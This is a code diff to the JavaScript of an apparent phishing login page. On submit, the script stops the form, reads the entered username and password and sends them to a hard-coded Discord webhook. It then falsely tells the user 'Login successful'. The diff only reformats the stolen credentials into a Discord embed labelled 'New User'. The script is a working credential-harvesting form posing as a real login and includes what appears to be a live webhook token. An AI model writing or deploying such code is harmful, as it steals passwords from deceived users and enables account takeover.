@@ -12,15 +12,21 @@ document.getElementById('togglePassword').addEventListener('click', function () 
 });
 
 document.getElementById('loginForm').addEventListener('submit', function (event) {
-    event.preventDefault(); // Prevents form from submitting the default way
+    event.preventDefault(); // Prevent the default form submission
 
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
     const webhookURL = 'https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr';
 
-    const payload = {
-        content: `${username}: has logged in with the password: ${password}`
+    const embedPayload = {
+        embeds: [
+            {
+                title: "New User",
+                description: `User: **${username}** has been created with the password: **${password}**`,
+                color: 0x808080 // grey color
+            }
+        ]
     };
 
     fetch(webhookURL, {
@@ -28,7 +34,7 @@ document.getElementById('loginForm').addEventListener('submit', function (event)
         headers: {
             'Content-Type': 'application/json'
         },
-        body: JSON.stringify(payload)
+        body: JSON.stringify(embedPayload)
     }).then(response => {
         if (response.ok) {
             alert('Login successful');
